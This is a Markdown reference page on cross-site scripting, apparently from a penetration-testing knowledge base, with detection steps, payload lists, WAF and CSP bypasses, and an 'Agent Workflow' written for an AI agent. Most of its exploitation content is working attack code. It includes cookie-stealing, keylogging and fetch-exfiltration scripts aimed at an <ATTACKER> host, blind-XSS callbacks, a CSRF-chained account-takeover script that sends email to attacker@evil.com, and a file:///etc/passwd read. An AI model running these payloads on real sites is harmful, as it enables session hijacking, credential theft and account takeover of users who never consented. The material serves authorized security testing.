# XSS (Cross-Site Scripting)

> **Summary**: Injection of malicious scripts into web pages viewed by other users, via reflected, stored, or DOM-based vectors.
> **Impact**: Session hijacking, credential theft, defacement, malware distribution, full account takeover.
> **Typical Severity**: High | Critical (Stored/Blind) | Medium (Reflected/DOM)

---

## Detection

### Indicators
- User-controlled input reflected in HTML responses without encoding
- Parameters reflected inside `<script>` blocks, HTML attributes, or tag bodies
- JavaScript sinks consuming data from `location`, `document.cookie`, `document.referrer`, `window.name`
- Application accepts and stores HTML/JS in fields like profile bios, comments, file names

### Automated Detection
```bash
# Dalfox - parameter analysis and XSS scanning
# https://github.com/hahwul/dalfox
dalfox url http://example.com
cat urls | dalfox pipe - --skip-bav --skip-mining-all

# Gxss - find reflected parameters that could lead to XSS
# https://github.com/KathanP19/Gxss
cat list | Gxss -c 100 -p REPLACE_STRING
```

### Manual Detection
1. Inject a canary string (e.g., `xss123test`) into every parameter, path segment, header, and cookie
2. Search the response for the canary to identify reflection points
3. Determine the **context**: raw HTML, inside an attribute, inside `<script>`, inside a JS string, template literal
4. Test which characters are reflected unencoded: `< > " ' / \`` `( )`
5. Build a context-appropriate payload

### Semgrep for DOM XSS
Download and beautify JavaScript files, then scan for source-to-sink flows:
```bash
semgrep -c xss.yaml scripts/*
```

> JavaScript files must be beautified first, otherwise semgrep will not work properly.

**Pattern-based detection (sources and sinks):**

Common DOM sources: `document.URL`, `document.documentURI`, `document.baseURI`, `document.cookie`, `document.referrer`, `location.search`, `location.hash`, `location.pathname`, `location.href`, `window.name`, `localStorage`, `sessionStorage`

Common DOM sinks: `innerHTML`, `outerHTML`, `insertAdjacentHTML()`, `document.write()`, `document.writeln()`, `eval()`, `setTimeout()`, `setInterval()`, `Function()`, `script.src`, `iframe.src`, `location.href`, `location.assign()`, `location.replace()`, `$.html()`, `$.parseHTML()`

---

## Exploitation

### Prerequisites
- User-controlled input reflected or used in the page
- Insufficient input validation / output encoding
- For Stored XSS: ability to persist payload (comments, profiles, file uploads)
- For DOM XSS: JavaScript code that passes attacker-controlled source data to a dangerous sink

### XSS Types

| Type | Description | Persistence |
|------|-------------|-------------|
| Reflected | Payload in request is reflected in immediate response | None |
| Stored | Payload persisted server-side, served to other users | Persistent |
| DOM-based | Payload processed entirely client-side via JS sinks | Depends |
| Blind | Stored XSS that triggers in a different context (admin panel, logs) | Persistent |

### Step-by-Step

1. **Identify reflection points** - inject a unique string and search for it in the response
2. **Determine the context** - raw HTML, attribute value, JS string, template literal, URL
3. **Test character filtering** - which of `< > " ' \`` `/ ( ) ; { }` pass through unencoded
4. **Craft context-appropriate payload** - see Payloads section below
5. **Verify execution** - use `alert(document.domain)` or callback to Burp Collaborator / webhook
6. **Escalate** - cookie theft, keylogging, phishing, or chaining with CSRF

**Success criteria**: JavaScript execution in the context of the victim's browser session

### Payloads

#### Raw HTML Context
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src>">
```

#### Inside HTML Attribute
```html
" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) x="
" accesskey="x" onclick="alert(1)" x="
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
'onfocus='alert(1)' autofocus='
javascript:alert(1)    <!-- for href, src, action attributes -->
```

#### Inside JavaScript String
```javascript
'-alert(1)-'
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>
```

#### Inside Template Literals
```javascript
${alert(1)}
${constructor.constructor('alert(1)')()}
```

#### Inside JavaScript URL (href, src)
```
javascript:alert(1)
javascript://trusted.example.com/%0Aalert(1)   <!-- Safari -->
```

#### Event Handlers Without Parentheses
```html
<img src=x onerror=alert`1`>
<svg onload=alert&lpar;1&rpar;>
<img src=x onerror=location='javascript:alert(1)'>
```

### Proof of Concept
```html
<!-- Cookie stealing -->
<script>new Image().src="https://<ATTACKER>/steal?c="+document.cookie</script>

<!-- Keylogger -->
<script>document.onkeypress=function(e){new Image().src="https://<ATTACKER>/k?k="+e.key}</script>

<!-- Session hijacking via fetch -->
<script>
fetch("https://<ATTACKER>/exfil", {
  method: "POST",
  body: document.cookie
});
</script>
```

---

## Bypasses

### Case Variation
```html
<ScRiPt>alert(1);</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
<object data="JaVaScRiPt:alert(1)">
```

### No Spaces
```html
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
```

### JavaScript Encoding
```
Unicode:       \u0061\u006c\u0065\u0072\u0074(1)
Octal:         \141\154\145\162\164(1)
Hex:           \x61\x6c\x65\x72\x74(1)
ES6 Unicode:   ale\u{72}t(1\x29)
Base64:        atob("YWxlcnQoMSk=")
```

### String Construction (No Direct Keywords)
```javascript
String.fromCharCode(97,108,101,114,116,40,49,41)
/alert(1)/.source
decodeURI(/alert(%22xss%22)/.source)
[].constructor.constructor("alert(1)")()
```

### Execution Sinks (Keyword-Free)
```javascript
eval("alert(1)")
setTimeout("alert(1)")
setInterval("alert(1)")
Function("alert(1)")()
[].constructor.constructor("alert(1)")()
```

### WAF Bypass - Akamai
```
"><a/\test="%26quot"href=%27javascript:/**/;\ale\u{72}t(11111\x29");%27>Click
```

### CSP Bypass

**Common CSP directives**: `script-src`, `style-src`, `img-src`, `object-src`, `connect-src`, `default-src`, `frame-ancestors`, `form-action`

**Techniques:**
- If Google domains are whitelisted:
  ```
  www.google.com/complete/search?client=chrome&q=1&jsonp=alert(1)//
  accounts.google.com/o/oauth2/revoke?callback=alert(1)
  ```
- JSONP endpoints on whitelisted CDNs
- `base-uri` not set: inject `<base href="https://<ATTACKER>/">` to hijack relative script loads
- `script-src 'unsafe-inline'`: direct XSS
- `script-src 'unsafe-eval'`: use `eval()`, `setTimeout()`, `Function()`
- Missing `object-src`: use `<object>` or `<embed>` with Flash/Java
- `script-src 'nonce-<VALUE>'`: find nonce reuse or injection point before nonce tag

See also: [CSP Evaluator](https://csp-evaluator.withgoogle.com/)

### Markdown Parsers
Markdown renderers can be vulnerable to XSS via nested parsers. Reference: [Fuzzing for XSS via Nested Parsers](https://swarm.ptsecurity.com/fuzzing-for-xss-via-nested-parsers-condition/)

---

## Advanced Techniques

### DOM Clobbering
Override JavaScript global variables via HTML `id`/`name` attributes:
```html
<a href="controlled-value" id="x"></a>
<!-- In JS: x.toString() returns "controlled-value" -->

<!-- Array clobbering -->
<a id="x"><a id="x" name="y" href="controlled"></a>
<!-- x[1] and x.y both return "controlled" -->

<!-- Deep clobbering via form -->
<form id="x" name="y"><input id="z" value="controlled"></form>
<!-- x.y.z.value returns "controlled" -->
```

### Mutation XSS (mXSS)
Exploits browser HTML parser mutations where sanitized HTML is re-parsed and becomes dangerous. Targets DOMPurify and similar sanitizers when they fail to account for parser quirks.

### Prototype Pollution to XSS
If prototype pollution exists, it may be chained to XSS by polluting properties consumed by frameworks or libraries:
```javascript
// Pollute Object.prototype to inject attributes
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>'
```

### Client-Side Template Injection (CSTI)
**AngularJS:**
```
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```
Angular class name injection:
```html
<div ng-app>
  <strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```

**Vue.js:**
```
{{_c.constructor('alert(1)')()}}
```

### Blind XSS
Payloads that fire in admin panels, log viewers, support tickets, or email clients:
```html
<script src=https://<ATTACKER>/blind.js></script>
"><img src=x onerror=this.src='https://<ATTACKER>/?c='+document.cookie>
```
Use platforms like [XSS Hunter](https://xsshunter.com/) or [bXSS](https://github.com/LewisArdern/bXSS).

### Server-Side XSS in Dynamic PDFs
When user input is rendered into PDFs via wkhtmltopdf, Puppeteer, or similar:
```html
<iframe src="file:///etc/passwd" width="1000" height="1000">
<script>document.write(window.location)</script>
```

---

## Escalation
- **Session hijacking**: steal cookies, tokens, or session identifiers
- **Account takeover**: change email/password via CSRF-like requests from XSS context
- **Keylogging**: capture credentials as they are typed
- **Phishing**: inject fake login forms into trusted domains
- **Worm propagation**: self-replicating stored XSS (e.g., Samy worm)
- **Chain with [CSRF](csrf.md)**: bypass CSRF tokens by extracting them via DOM access
- **Chain with [Clickjacking](clickjacking.md)**: overlay invisible frames
- **Pivot to internal network**: use XSS as a proxy to scan/attack internal hosts
- See also: [Cookie-Based Attacks](cookie-based-attacks.md), [Open Redirect](open-redirect.md)

---

## Tools

| Tool | Usage |
|------|-------|
| [Dalfox](https://github.com/hahwul/dalfox) | `dalfox url <URL>` - automated XSS scanner |
| [Gxss](https://github.com/KathanP19/Gxss) | `cat urls \| Gxss -c 100` - find reflected params |
| [XSStrike](https://github.com/s0md3v/XSStrike) | `python xsstrike.py -u <URL>` - intelligent XSS detection |
| [kxss](https://github.com/Emoe/kxss) | Reflected parameter finder |
| [DOMLoggerpp](https://github.com/kevin-mizu/domloggerpp) | Browser extension to trace DOM sources/sinks |
| [Semgrep](https://semgrep.dev/) | Static analysis for JS source-to-sink flows |
| [XSS Hunter](https://xsshunter.com/) | Blind XSS callback platform |
| [Burp Suite](https://portswigger.net/) | Active/passive XSS scanning |
| [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) | Burp browser extension for DOM XSS |

---

## Agent Workflow
> Step-by-step instructions for an AI agent to test for this vulnerability.

### Phase 1: Discovery

1. **Gather target endpoints and parameters**
   ```bash
   # Crawl the application for endpoints
   katana -u <TARGET_URL> -d 3 -jc -o katana_output.txt

   # Discover parameters from web archives
   paramspider -d <TARGET_DOMAIN> --output paramspider_output.txt

   # Collect historical URLs
   gau <TARGET_DOMAIN> --threads 5 --o gau_output.txt

   # Merge and deduplicate
   cat katana_output.txt paramspider_output.txt gau_output.txt | uro | sort -u > all_urls.txt
   ```
   - **Expected output**: A deduplicated list of URLs with query parameters.
   - **Decision**: If the list is empty, manually browse the application and test input fields, path segments, and HTTP headers.

2. **Identify reflected parameters**
   ```bash
   # Find parameters that reflect input in the response
   cat all_urls.txt | Gxss -c 100 -p xss13test | sort -u > reflected_params.txt
   ```
   - **Expected output**: URLs where the canary string `xss13test` appears in the response body.
   - **Decision**: If no reflected parameters are found, test for Stored XSS by submitting payloads into persistent input fields (comments, profiles, file names) and checking if they render on other pages. Also test for DOM XSS by analyzing JavaScript files for source-to-sink flows.

3. **Analyze JavaScript for DOM XSS sinks**
   ```bash
   # Download and beautify JS files, then scan for source-to-sink flows
   cat all_urls.txt | grep "\.js$" | sort -u > js_files.txt
   # Download each JS file, beautify with js-beautify, then:
   semgrep -c xss.yaml scripts/
   ```
   - **Expected output**: Semgrep findings showing data flow from DOM sources (`location.hash`, `document.URL`, `window.name`) to sinks (`innerHTML`, `document.write`, `eval`).

### Phase 2: Validation

4. **Determine reflection context** for each reflected parameter:
   - Submit `xss"'<>(){}` and inspect the raw HTML response.
   - **If** the canary appears inside an HTML tag body (e.g., `<div>xss"'<>(){}</div>`): **Raw HTML context** -- proceed with tag-based payloads.
   - **If** the canary appears inside an HTML attribute (e.g., `value="xss"'<>(){}"`): **Attribute context** -- proceed with attribute breakout payloads.
   - **If** the canary appears inside a `<script>` block (e.g., `var x = "xss"'<>(){}";`): **JavaScript string context** -- proceed with JS breakout payloads.
   - **If** the canary appears inside a template literal (e.g., `` `...xss"'<>(){}...` ``): **Template literal context** -- proceed with `${alert(1)}`.
   - **If** the canary appears in a `javascript:` URI (e.g., `href="javascript:..."`): **JavaScript URL context** -- proceed with `javascript:alert(1)`.

5. **Test character encoding/filtering**
   - Submit each special character individually: `<`, `>`, `"`, `'`, `` ` ``, `(`, `)`, `/`, `{`, `}`, `;`
   - Record which characters are reflected unencoded vs. HTML-encoded vs. stripped.
   - **Decision**: If `<` and `>` are encoded but `"` is not, focus on attribute context payloads. If all are encoded, test for DOM XSS or mXSS vectors.

### Phase 3: Exploitation

6. **Craft context-specific payload**
   - **Raw HTML context**: `<img src=x onerror=alert(document.domain)>`
   - **Attribute context**: `" autofocus onfocus=alert(document.domain) x="`
   - **JS string context**: `'-alert(document.domain)-'` or `</script><script>alert(document.domain)</script>`
   - **Template literal context**: `${alert(document.domain)}`
   - **JavaScript URL context**: `javascript:alert(document.domain)`

7. **If payload is blocked (WAF/filter), attempt bypass**
   ```bash
   # Automated bypass with Dalfox
   dalfox url "<TARGET_URL_WITH_PARAM>" --skip-bav

   # Pipe reflected URLs into Dalfox
   cat reflected_params.txt | dalfox pipe --skip-bav --skip-mining-all

   # Nuclei XSS templates
   nuclei -u <TARGET_URL> -tags xss
   ```
   - Apply WAF-specific bypasses: case variation (`<ScRiPt>`), no-space tags (`<svg/onload=alert(1)>`), encoding (`\u0061lert(1)`), or string construction (`[].constructor.constructor("alert(1)")()`).
   - **Decision**: If all reflected XSS attempts fail, pivot to testing for Stored XSS or DOM-based XSS.

8. **For Blind XSS** (stored XSS in admin panels, logs, support tickets):
   ```html
   <script src=https://<ATTACKER_XSS_HUNTER_DOMAIN>/probe.js></script>
   "><img src=x onerror=this.src='https://<ATTACKER>/?c='+document.cookie>
   ```
   - Submit blind payloads into all input fields that may be viewed by admins: support tickets, feedback forms, user profile fields, file names, HTTP headers (`User-Agent`, `Referer`).
   - Monitor XSS Hunter or Burp Collaborator for callbacks.

### Phase 4: Escalation

9. **Cookie stealing / Session hijacking**
   ```html
   <script>new Image().src="https://<ATTACKER>/steal?c="+document.cookie</script>
   ```
   - **If** `HttpOnly` flag is set on session cookies: pivot to keylogging or phishing.

10. **Keylogging**
    ```html
    <script>document.onkeypress=function(e){new Image().src="https://<ATTACKER>/k?k="+e.key}</script>
    ```

11. **Account takeover via CSRF chaining**
    - Use XSS to extract CSRF tokens from the DOM, then change the victim's email/password:
      ```javascript
      fetch('/settings').then(r=>r.text()).then(t=>{
        let token = t.match(/csrf_token.*?value="(.*?)"/)[1];
        fetch('/settings/change-email', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'email=attacker@evil.com&csrf='+token});
      });
      ```

12. **Phishing** -- inject a fake login form into the trusted domain to harvest credentials.

13. **Pivot to internal network** -- use XSS as a browser-based proxy to scan internal hosts via `fetch()`.

## Decision Tree

```
START: Inject canary string into all parameters, headers, path segments
  |
  +-- Canary reflected in response?
  |     |
  |     +-- YES --> Determine context (HTML body / attribute / JS / template)
  |     |             |
  |     |             +-- HTML body --> Try <img src=x onerror=alert(1)>
  |     |             |     +-- Blocked? --> Case variation, encoding, tag alternatives
  |     |             |     +-- Fires? --> SUCCESS (Reflected XSS)
  |     |             |
  |     |             +-- Attribute --> Try " onfocus=alert(1) autofocus x="
  |     |             |     +-- Quotes encoded? --> Try event handler without quote break
  |     |             |     +-- Fires? --> SUCCESS (Reflected XSS)
  |     |             |
  |     |             +-- JS string --> Try '-alert(1)-' or </script><script>alert(1)</script>
  |     |             |     +-- Escaped? --> Try \\'-alert(1)// or template literal ${alert(1)}
  |     |             |     +-- Fires? --> SUCCESS (Reflected XSS)
  |     |             |
  |     |             +-- JS URL --> Try javascript:alert(1)
  |     |                   +-- Fires? --> SUCCESS (Reflected XSS)
  |     |
  |     +-- NO --> Test for Stored XSS
  |           |
  |           +-- Submit payload in persistent fields (comments, profiles, filenames)
  |           +-- Check if payload renders on other pages / for other users
  |           +-- Fires? --> SUCCESS (Stored XSS)
  |           |
  |           +-- NO --> Test for DOM XSS
  |                 |
  |                 +-- Analyze JS files with Semgrep / DOMLoggerpp / DOM Invader
  |                 +-- Trace source-to-sink data flows
  |                 +-- Craft payload targeting identified sink
  |                 +-- Fires? --> SUCCESS (DOM XSS)
  |                 |
  |                 +-- NO --> Test Blind XSS
  |                       +-- Submit XSS Hunter payloads in all fields
  |                       +-- Wait for callback from admin/backend context
  |                       +-- Callback received? --> SUCCESS (Blind XSS)
  |                       +-- NO --> XSS not found for this target
```

## Success Criteria

- **Confirmed Reflected XSS**: `alert(document.domain)` fires in the browser when visiting the crafted URL, proving JavaScript execution in the application's origin.
- **Confirmed Stored XSS**: Payload persists and fires for other users or in a different session without re-injection.
- **Confirmed DOM XSS**: Payload executes via client-side JavaScript sink, visible through browser DevTools or alert box.
- **Confirmed Blind XSS**: XSS Hunter or Burp Collaborator receives a callback containing the execution context (URL, cookies, DOM snapshot).
- **Escalation confirmed**: Session cookie exfiltrated, account settings changed, or internal network data retrieved via XSS-based fetch requests.

---

## References

| URL | Description |
|-----|-------------|
| [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting) | Comprehensive XSS learning resource |
| [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html) | Defense guidance |
| [HackTricks XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting) | Extensive XSS methodology |
| [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) | Payload repository |
| [XSS Pwnfunction](https://xss.pwnfunction.com/) | Interactive XSS challenges |
| [Bypassing XSS Detection Mechanisms](https://github.com/s0md3v/MyPapers/tree/master/Bypassing-XSS-detection-mechanisms) | WAF bypass research |
| [HTML Parser Quirks](https://htmlparse.hackaplaneten.se/) | Parser differential testing |
| [Fuzzing for XSS via Nested Parsers](https://swarm.ptsecurity.com/fuzzing-for-xss-via-nested-parsers-condition/) | Markdown parser XSS |
| [DOMXSSWiki](https://github.com/wisec/domxsswiki/wiki) | Updated list of DOM sources and sinks |
